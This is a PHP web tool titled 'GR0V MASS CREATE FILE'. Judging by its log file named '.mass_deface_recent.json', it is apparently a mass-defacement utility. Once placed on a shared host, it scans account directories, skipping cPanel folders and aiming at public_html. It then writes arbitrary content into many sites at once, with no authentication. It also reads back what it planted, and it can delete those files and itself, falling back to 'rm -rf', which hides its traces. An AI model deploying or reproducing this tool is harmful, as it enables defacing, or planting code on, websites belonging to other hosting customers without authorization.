<?php
$folders = $errors = $results = [];
$basePath = '';
$fixedFolder = '';
$deepFolders2 = [];
$deepFolders3 = [];
$deepFolders2_one = [];
$ignoreFoldersDefault = ['ssl','tmp','www','access-logs','.cagefs','etc','logs','mail','.cpanel','.trash','public_ftp','public_html','.softaculous','.pki','.config','.cache','.local','.ssh','.git','.svn'];
$ignoreFolders = $ignoreFoldersDefault;
$currentDirList = [];
$deepScan = $_POST['deepscan'] ?? '0';
$recentFileLog = __DIR__ . '/.mass_deface_recent.json';
$recentFileContents = [];
$checkedFolders = $_POST['folders'] ?? [];

function add_recent_file($path) {
    global $recentFileLog;
    $list = [];
    if (file_exists($recentFileLog)) {
        $list = json_decode(file_get_contents($recentFileLog), 1) ?: [];
    }
    $list[] = $path;
    file_put_contents($recentFileLog, json_encode($list));
}

function delete_file_like_rm($file) {
    if (is_file($file) || is_link($file)) {
        if (@unlink($file)) return true;
        if (function_exists('system')) {
            @system('rm -f ' . escapeshellarg($file));
            if (!file_exists($file)) return true;
        }
        if (@unlink($file)) return true;
        return false;
    } elseif (is_dir($file)) {
        $files = array_diff(scandir($file), ['.','..']);
        foreach ($files as $f) {
            delete_file_like_rm("$file/$f");
        }
        if (@rmdir($file)) return true;
        if (function_exists('system')) {
            @system('rm -rf ' . escapeshellarg($file));
            if (!file_exists($file)) return true;
        }
        if (@rmdir($file)) return true;
        return false;
    }
    return false;
}

function delete_recent_files(&$results) {
    global $recentFileLog;
    if (!file_exists($recentFileLog)) {
        $results[] = "No recent files to delete.";
        return;
    }
    $list = json_decode(file_get_contents($recentFileLog), 1) ?: [];
    $deleted = 0;
    foreach ($list as $f) {
        if (file_exists($f) && is_file($f)) {
            if (delete_file_like_rm($f)) $deleted++;
        }
    }
    @unlink($recentFileLog);
    $results[] = $deleted ? "Deleted $deleted recent file(s)." : "No recent files deleted.";
}

function read_recent_files(&$recentFileContents, &$results) {
    global $recentFileLog;
    if (!file_exists($recentFileLog)) {
        $results[] = "No recent files to read.";
        return;
    }
    $list = json_decode(file_get_contents($recentFileLog), 1) ?: [];
    foreach ($list as $f) {
        if (file_exists($f) && is_file($f)) {
            $recentFileContents[] = [
                'path' => $f,
                'content' => @file_get_contents($f)
            ];
        }
    }
    if (!$recentFileContents) {
        $results[] = "No recent files found or readable.";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $basePath = isset($_POST['basepath']) ? rtrim(trim($_POST['basepath']), '/') : '';
    $fixedFolder = isset($_POST['fixedfolder']) ? trim($_POST['fixedfolder']) : '';
    if (isset($_POST['ignorefolders'])) {
        $customIgnore = trim($_POST['ignorefolders']);
        if ($customIgnore !== '') {
            $ignoreFolders = array_filter(array_map('trim', explode(',', $customIgnore)));
        }
    }
    if (isset($_POST['scan'])) {
        if ($basePath === '') $errors[] = "Base path cannot be empty.";
        elseif (!is_dir($basePath)) $errors[] = "Base path '$basePath' not found or not a directory.";
        else {
            if ($deepScan === '2') {
                foreach (scandir($basePath) as $i) {
                    if ($i === '.' || $i === '..' || strpos($i, '.') === 0 || in_array($i, $ignoreFolders)) continue;
                    $p1 = "$basePath/$i";
                    if (is_dir($p1)) {
                        foreach (scandir($p1) as $j) {
                            if ($j === '.' || $j === '..' || strpos($j, '.') === 0 || in_array($j, $ignoreFolders)) continue;
                            $p2 = "$p1/$j";
                            if (is_dir($p2)) {
                                $deepFolders2[] = "$i/$j";
                            }
                        }
                    }
                }
                if (!$deepFolders2) $errors[] = "No 2-level subfolders found in base path '$basePath'.";
            } elseif ($deepScan === '2one') {
                // New scan mode: for each parent, only 1 readable subfolder, skip cgi-bin and .well-known
                foreach (scandir($basePath) as $i) {
                    if ($i === '.' || $i === '..' || strpos($i, '.') === 0 || in_array($i, $ignoreFolders)) continue;
                    $p1 = "$basePath/$i";
                    if (is_dir($p1)) {
                        $found = false;
                        foreach (scandir($p1) as $j) {
                            if ($j === '.' || $j === '..' || strpos($j, '.') === 0 || in_array($j, $ignoreFolders)) continue;
                            if ($j === 'cgi-bin' || $j === '.well-known') continue;
                            $p2 = "$p1/$j";
                            if (is_dir($p2) && is_readable($p2)) {
                                $deepFolders2_one[] = "$i/$j";
                                $found = true;
                                break; // Only one per parent
                            }
                        }
                    }
                }
                if (!$deepFolders2_one) $errors[] = "No 2-level (one per parent) subfolders found in base path '$basePath'.";
            } elseif ($deepScan === '3') {
                foreach (scandir($basePath) as $i) {
                    if ($i === '.' || $i === '..' || strpos($i, '.') === 0 || in_array($i, $ignoreFolders)) continue;
                    $p1 = "$basePath/$i";
                    if (is_dir($p1)) {
                        foreach (scandir($p1) as $j) {
                            if ($j === '.' || $j === '..' || strpos($j, '.') === 0 || in_array($j, $ignoreFolders)) continue;
                            $p2 = "$p1/$j";
                            if (is_dir($p2)) {
                                foreach (scandir($p2) as $k) {
                                    if ($k === '.' || $k === '..' || strpos($k, '.') === 0 || in_array($k, $ignoreFolders)) continue;
                                    $p3 = "$p2/$k";
                                    if (is_dir($p3)) {
                                        $deepFolders3[] = "$i/$j/$k";
                                    }
                                }
                            }
                        }
                    }
                }
                if (!$deepFolders3) $errors[] = "No 3-level subfolders found in base path '$basePath'.";
            } else {
                foreach (scandir($basePath) as $i) {
                    if ($i === '.' || $i === '..' || strpos($i, '.') === 0 || in_array($i, $ignoreFolders)) continue;
                    if (is_dir("$basePath/$i")) $folders[] = $i;
                }
                if (!$folders) $errors[] = "No folders found in base path '$basePath'.";
            }
        }
    }
    if (isset($_POST['create'])) {
        $selectedFolders = $_POST['folders'] ?? [];
        $filename = trim($_POST['filename'] ?? '');
        $content = $_POST['content'] ?? '';
        $fixedFolder = isset($_POST['fixedfolder']) ? trim($_POST['fixedfolder']) : '';
        if ($basePath === '' || !is_dir($basePath)) $errors[] = "Base path is not valid.";
        if (!$selectedFolders) $errors[] = "Select at least one folder.";
        if ($filename === '') $errors[] = "Filename cannot be empty.";
        if ($content === '') $errors[] = "File content cannot be empty.";
        if (!$errors) foreach ($selectedFolders as $folder) {
            $fullPath = $basePath . '/' . $folder . ($fixedFolder !== '' ? '/' . $fixedFolder : '');
            if (!is_dir($fullPath) && !mkdir($fullPath, 0755, true)) {
                $results[] = "Failed to create folder: $fullPath";
                continue;
            }
            $filePath = "$fullPath/$filename";
            if (file_put_contents($filePath, $content) !== false) {
                $results[] = "File created: $filePath";
                add_recent_file($filePath);
            } else {
                $results[] = "Failed to create file: $filePath";
            }
        }
        $checkedFolders = $selectedFolders;
    }
    if (isset($_POST['delete'])) {
        $f = __FILE__;
        if (file_exists($f)) {
            $deletedFile = delete_file_like_rm($f);
            $results[] = $deletedFile ? "This file was deleted: $f" : "Failed to delete this file: $f";
            if (file_exists($recentFileLog)) {
                if (delete_file_like_rm($recentFileLog)) {
                    $results[] = "Recent file log deleted: $recentFileLog";
                } else {
                    $results[] = "Failed to delete recent file log: $recentFileLog";
                }
            }
        } else {
            $results[] = "This file was not found: $f";
        }
    }
    if (isset($_POST['delete_recent'])) {
        delete_recent_files($results);
    }
    if (isset($_POST['readcurrent'])) {
        $dir = getcwd();
        $list = [];
        foreach (scandir($dir) as $item) {
            if ($item === '.' || $item === '..') continue;
            $list[] = $item . (is_dir($dir . '/' . $item) ? '/' : '');
        }
        $currentDirList = $list;
    }
    if (isset($_POST['read_recent'])) {
        read_recent_files($recentFileContents, $results);
    }
}
?>
<style>
body {
    font-family: 'Segoe UI', Arial, sans-serif;
    background: #f4f6fa;
    margin: 0;
    padding: 0;
    min-height: 100vh;
}
.main-container {
    max-width: 700px;
    margin: 40px auto 0;
    background: #fff;
    border-radius: 16px;
    box-shadow: 0 4px 32px #e0e7ef;
    padding: 0 0 30px 0;
    overflow: hidden;
}
.header {
    background: linear-gradient(90deg, #3b82f6 0%, #6366f1 100%);
    color: #fff;
    padding: 36px 0 24px 0;
    text-align: center;
    font-size: 2.2em;
    font-weight: 800;
    letter-spacing: 2px;
    border-bottom: 1px solid #e0e7ef;
    box-shadow: 0 2px 12px #e0e7ef;
}
.form-section {
    padding: 32px 32px 18px 32px;
}
@media (max-width: 700px) {
    .main-container { max-width: 99vw; }
    .form-section { padding: 18px 5vw; }
}
label {
    font-weight: 600;
    color: #22223b;
    margin-bottom: 6px;
    display: block;
}
input[type="text"], textarea {
    border: 1.5px solid #d1d5db;
    border-radius: 8px;
    padding: 12px;
    font-size: 16px;
    width: 100%;
    margin-bottom: 16px;
    background: #f9fafb;
    box-sizing: border-box;
    transition: border .2s;
}
input[type="text"]:focus, textarea:focus {
    border: 2px solid #6366f1;
    outline: none;
    background: #fff;
}
input[type="radio"], input[type="checkbox"] {
    accent-color: #6366f1;
    margin-right: 8px;
}
.btn-row {
    display: flex;
    gap: 12px;
    flex-wrap: wrap;
    margin-bottom: 18px;
}
button {
    background: linear-gradient(90deg, #3b82f6 0%, #6366f1 100%);
    color: #fff;
    border: none;
    padding: 12px 0;
    font-size: 16px;
    border-radius: 8px;
    cursor: pointer;
    flex: 1;
    font-weight: 600;
    transition: background .2s, box-shadow .2s;
    box-shadow: 0 2px 8px #e0e7ef;
}
button:hover {
    background: linear-gradient(90deg, #6366f1 0%, #3b82f6 100%);
    box-shadow: 0 4px 16px #c7d2fe;
}
button.btn-green { background: linear-gradient(90deg, #10b981 0%, #22d3ee 100%); color: #fff; }
button.btn-yellow { background: linear-gradient(90deg, #fbbf24 0%, #f59e42 100%); color: #22223b; }
button.btn-red { background: linear-gradient(90deg, #ef4444 0%, #f87171 100%); color: #fff; }
button.btn-gray { background: #e0e7ef; color: #22223b; }
button.btn-gray:hover { background: #c7d2fe; color: #1e293b; }
.error, .success, .info {
    border-radius: 8px;
    padding: 16px 22px;
    margin-bottom: 22px;
    font-size: 16px;
    box-shadow: 0 2px 8px #e0e7ef;
}
.error { background: #fee2e2; color: #b91c1c; border-left: 5px solid #ef4444; }
.success { background: #d1fae5; color: #065f46; border-left: 5px solid #10b981; }
.info { background: #f3f4f6; color: #374151; border-left: 5px solid #6366f1; }
.checkbox-group {
    margin-bottom: 18px;
    background: #f9fafb;
    border-radius: 8px;
    padding: 16px 18px 10px 18px;
    box-shadow: 0 1px 4px #e0e7ef;
}
.checkbox-group label {
    display: flex;
    align-items: center;
    font-weight: 400;
    margin-bottom: 8px;
    font-size: 15px;
    color: #22223b;
}
.btn-group {
    margin-bottom: 12px;
    display: flex;
    gap: 8px;
}
.btn-group button {
    flex: none;
    background: #e0e7ef;
    color: #22223b;
    font-size: 14px;
    padding: 7px 18px;
    border-radius: 6px;
    border: none;
    font-weight: 500;
    box-shadow: none;
    transition: background .2s;
}
.btn-group button:hover {
    background: #c7d2fe;
    color: #1e293b;
}
pre {
    background: #f3f4f6;
    padding: 10px 14px;
    border-radius: 8px;
    overflow-x: auto;
    font-size: 15px;
    margin: 8px 0 0 0;
}
ul { margin: 0 0 0 18px; }
</style>
<div class="main-container">
    <div class="header">GR0V MASS CREATE FILE</div>
    <form method="post" novalidate class="form-section" id="massForm" autocomplete="off">
        <?php if ($errors): ?>
            <div class="error">
                <ul>
                    <?php foreach ($errors as $e): ?><li><?= htmlspecialchars($e) ?></li><?php endforeach; ?>
                </ul>
            </div>
        <?php endif; ?>
        <?php if ($results): ?>
            <div class="success">
                <ul>
                    <?php foreach ($results as $r): ?><li><?= htmlspecialchars($r) ?></li><?php endforeach; ?>
                </ul>
            </div>
        <?php endif; ?>
        <?php if ($currentDirList): ?>
            <div class="info">
                <b>Current Directory (<?= htmlspecialchars(getcwd()) ?>):</b>
                <ul>
                    <?php foreach ($currentDirList as $item): ?>
                        <li><?= htmlspecialchars($item) ?></li>
                    <?php endforeach; ?>
                </ul>
            </div>
        <?php endif; ?>
        <?php if ($recentFileContents): ?>
            <div class="info">
                <b>Recent File(s) Content:</b>
                <ul>
                    <?php foreach ($recentFileContents as $rf): ?>
                        <li>
                            <b><?= htmlspecialchars($rf['path']) ?></b>
                            <pre><?= htmlspecialchars($rf['content']) ?></pre>
                        </li>
                    <?php endforeach; ?>
                </ul>
            </div>
        <?php endif; ?>

        <label for="basepath">Base Path:</label>
        <input type="text" id="basepath" name="basepath" placeholder="/home/username" value="<?= htmlspecialchars($basePath) ?>" required>

        <label for="fixedfolder">Fixed Folder <span style="font-weight:400;color:#6b7280;">(optional)</span>:</label>
        <input type="text" id="fixedfolder" name="fixedfolder" placeholder="public_html" value="<?= htmlspecialchars($fixedFolder) ?>">

        <label for="ignorefolders">Ignore Folders <span style="font-weight:400;color:#6b7280;">(comma separated)</span>:</label>
        <input type="text" id="ignorefolders" name="ignorefolders" placeholder=".cagefs,.cpanel" value="<?= htmlspecialchars(isset($_POST['ignorefolders']) ? $_POST['ignorefolders'] : implode(',', $ignoreFoldersDefault)) ?>">

        <div class="btn-row">
            <button type="submit" name="scan" value="1">Check Path</button>
            <button type="submit" name="readcurrent" value="1" class="btn-green">Read Current Dir</button>
            <button type="submit" name="read_recent" value="1" class="btn-yellow">Read Recent File</button>
        </div>

        <div style="margin-bottom:18px;"><label style="display:inline-block;margin-right:18px;">
                <input type="radio" name="deepscan" value="0" <?= !in_array($deepScan, ['2', '2one', '3']) ? 'checked' : '' ?>> Normal (1-level)
            </label>
            <label style="display:inline-block;margin-right:18px;">
                <input type="radio" name="deepscan" value="2" <?= $deepScan === '2' ? 'checked' : '' ?>> Deep Scan 2-level (a/b)
            </label>
            <label style="display:inline-block;margin-right:18px;">
                <input type="radio" name="deepscan" value="2one" <?= $deepScan === '2one' ? 'checked' : '' ?>> Deep Scan 2-level (1 per parent, skip cgi-bin/.well-known)
            </label>
            <label style="display:inline-block;">
                <input type="radio" name="deepscan" value="3" <?= $deepScan === '3' ? 'checked' : '' ?>> Deep Scan 3-level (a/b/c)
            </label>
        </div>

        <?php if ($deepScan === '2' && $deepFolders2): ?>
            <div class="checkbox-group">
                <label style="font-weight:600;margin-bottom:10px;">Select subfolders (a/b):</label>
                <div class="btn-group">
                    <button type="button" class="btn-gray" onclick="checkAll()">Select All</button>
                    <button type="button" class="btn-gray" onclick="uncheckAll()">Deselect All</button>
                </div>
                <?php foreach ($deepFolders2 as $f): ?>
                    <label><input type="checkbox" name="folders[]" value="<?= htmlspecialchars($f) ?>" <?= in_array($f, $checkedFolders) ? 'checked' : '' ?>><?= htmlspecialchars($f) ?></label>
                <?php endforeach; ?>
            </div>
            <label for="filename">Filename:</label>
            <input type="text" id="filename" name="filename" placeholder="test.txt" required value="<?= isset($_POST['filename']) ? htmlspecialchars($_POST['filename']) : '' ?>">
            <label for="content">File Content:</label>
            <textarea id="content" name="content" rows="6" required><?= isset($_POST['content']) ? htmlspecialchars($_POST['content']) : '' ?></textarea>
            <div class="btn-row">
                <button type="submit" name="create" value="1" onclick="return keepCheckedFolders()">Create Files</button>
                <button type="submit" name="delete_recent" value="1" class="btn-yellow">Delete Recent Files</button>
                <button type="submit" name="delete" value="1" class="btn-red">Delete This File</button>
            </div>
        <?php elseif ($deepScan === '2one' && $deepFolders2_one): ?>
            <div class="checkbox-group">
                <label style="font-weight:600;margin-bottom:10px;">Select subfolders (a/b, 1 per parent, skip cgi-bin/.well-known):</label>
                <div class="btn-group">
                    <button type="button" class="btn-gray" onclick="checkAll()">Select All</button>
                    <button type="button" class="btn-gray" onclick="uncheckAll()">Deselect All</button>
                </div>
                <?php foreach ($deepFolders2_one as $f): ?>
                    <label><input type="checkbox" name="folders[]" value="<?= htmlspecialchars($f) ?>" <?= in_array($f, $checkedFolders) ? 'checked' : '' ?>><?= htmlspecialchars($f) ?></label>
                <?php endforeach; ?>
            </div>
            <label for="filename">Filename:</label>
            <input type="text" id="filename" name="filename" placeholder="test.txt" required value="<?= isset($_POST['filename']) ? htmlspecialchars($_POST['filename']) : '' ?>">
            <label for="content">File Content:</label>
            <textarea id="content" name="content" rows="6" required><?= isset($_POST['content']) ? htmlspecialchars($_POST['content']) : '' ?></textarea>
            <div class="btn-row">
                <button type="submit" name="create" value="1" onclick="return keepCheckedFolders()">Create Files</button>
                <button type="submit" name="delete_recent" value="1" class="btn-yellow">Delete Recent Files</button>
                <button type="submit" name="delete" value="1" class="btn-red">Delete This File</button>
            </div>
        <?php elseif ($deepScan === '3' && $deepFolders3): ?>
            <div class="checkbox-group">
                <label style="font-weight:600;margin-bottom:10px;">Select subfolders (a/b/c):</label>
                <div class="btn-group">
                    <button type="button" class="btn-gray" onclick="checkAll()">Select All</button>
                    <button type="button" class="btn-gray" onclick="uncheckAll()">Deselect All</button>
                </div>
                <?php foreach ($deepFolders3 as $f): ?>
                    <label><input type="checkbox" name="folders[]" value="<?= htmlspecialchars($f) ?>" <?= in_array($f, $checkedFolders) ? 'checked' : '' ?>><?= htmlspecialchars($f) ?></label>
                <?php endforeach; ?>
            </div>
            <label for="filename">Filename:</label>
            <input type="text" id="filename" name="filename" placeholder="test.txt" required value="<?= isset($_POST['filename']) ? htmlspecialchars($_POST['filename']) : '' ?>">
            <label for="content">File Content:</label>
            <textarea id="content" name="content" rows="6" required><?= isset($_POST['content']) ? htmlspecialchars($_POST['content']) : '' ?></textarea>
            <div class="btn-row">
                <button type="submit" name="create" value="1" onclick="return keepCheckedFolders()">Create Files</button>
                <button type="submit" name="delete_recent" value="1" class="btn-yellow">Delete Recent Files</button>
                <button type="submit" name="delete" value="1" class="btn-red">Delete This File</button>
            </div>
        <?php elseif (!in_array($deepScan, ['2', '2one', '3']) && $folders): ?>
            <div class="checkbox-group">
                <label style="font-weight:600;margin-bottom:10px;">Select folders:</label>
                <div class="btn-group">
                    <button type="button" class="btn-gray" onclick="checkAll()">Select All</button>
                    <button type="button" class="btn-gray" onclick="uncheckAll()">Deselect All</button>
                </div>
                <?php foreach ($folders as $f): ?>
                    <label><input type="checkbox" name="folders[]" value="<?= htmlspecialchars($f) ?>" <?= in_array($f, $checkedFolders) ? 'checked' : '' ?>><?= htmlspecialchars($f) ?></label>
                <?php endforeach; ?>
            </div>
            <label for="filename">Filename:</label>
            <input type="text" id="filename" name="filename" placeholder="test.txt" required value="<?= isset($_POST['filename']) ? htmlspecialchars($_POST['filename']) : '' ?>">
            <label for="content">File Content:</label>
            <textarea id="content" name="content" rows="6" required><?= isset($_POST['content']) ? htmlspecialchars($_POST['content']) : '' ?></textarea>
            <div class="btn-row">
                <button type="submit" name="create" value="1" onclick="return keepCheckedFolders()">Create Files</button>
                <button type="submit" name="delete_recent" value="1" class="btn-yellow">Delete Recent Files</button>
                <button type="submit" name="delete" value="1" class="btn-red">Delete This File</button>
            </div>
        <?php else: ?>
            <div class="btn-row">
                <button type="submit" name="delete_recent" value="1" class="btn-yellow">Delete Recent Files</button>
                <button type="submit" name="read_recent" value="1" class="btn-yellow">Read Recent File</button>
                <button type="submit" name="delete" value="1" class="btn-red">Delete This File</button>
            </div>
        <?php endif; ?>
    </form>
</div>
<script>
function checkAll() {
    document.querySelectorAll('input[type="checkbox"][name="folders[]"]').forEach(e => e.checked = true);
}
function uncheckAll() {
    document.querySelectorAll('input[type="checkbox"][name="folders[]"]').forEach(e => e.checked = false);
}
function keepCheckedFolders() {
    // Placeholder for AJAX or future logic.
    return true;
}
</script>
